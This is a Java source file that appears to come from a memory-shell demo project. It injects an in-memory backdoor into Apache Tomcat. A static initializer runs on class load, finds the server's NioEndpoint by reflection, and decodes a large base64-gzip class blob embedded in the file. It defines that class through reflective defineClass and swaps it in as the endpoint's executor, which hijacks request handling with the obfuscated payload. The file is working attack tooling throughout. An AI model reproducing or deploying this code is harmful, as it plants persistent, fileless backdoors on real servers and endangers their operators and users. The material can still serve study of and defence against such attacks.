package com.demo.memshell.exec.executor;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.concurrent.Executor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * ExecutorMS
 */
public class TomcatExecutorThreadLoader {
    private static String gzipObject = "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";

    public TomcatExecutorThreadLoader() {
    }

    static {
        try {
            // 获取
            Object nioEndpoint = getTargetObject("org.apache.tomcat.util.net.NioEndpoint");

            inject(nioEndpoint, null);

        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public static boolean isInject(Object standardContext, Object object) {
        return false;
    }
    public static void inject(Object nioEndpoint, Object object) throws Exception {
        Object threadPoolExecutor = getFieldValue(nioEndpoint, "executor");

        Object var1 = invokeMethod(threadPoolExecutor, "getCorePoolSize", new Class[]{}, new Object[]{});
        Object var2 = invokeMethod(threadPoolExecutor, "getMaximumPoolSize", new Class[]{}, new Object[]{});
        Object var3 = invokeMethod(threadPoolExecutor, "getKeepAliveTime", new Class[]{TimeUnit.class}, new Object[]{TimeUnit.MILLISECONDS});
        Object var4 = TimeUnit.MILLISECONDS;
        Object var5 = invokeMethod(threadPoolExecutor, "getQueue", new Class[]{}, new Object[]{});


        byte[] bytes = decompress(gzipObject);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        Constructor declaredConstructor = clazz.getDeclaredConstructors()[0];
        declaredConstructor.setAccessible(true);
        Object javaObject = declaredConstructor.newInstance(var1, var2, var3, var4, var5);
        nioEndpoint.getClass().getSuperclass().getSuperclass().getMethod("setExecutor", Executor.class).invoke(nioEndpoint, javaObject);
    }

    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new TomcatExecutorThreadLoader().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }

}
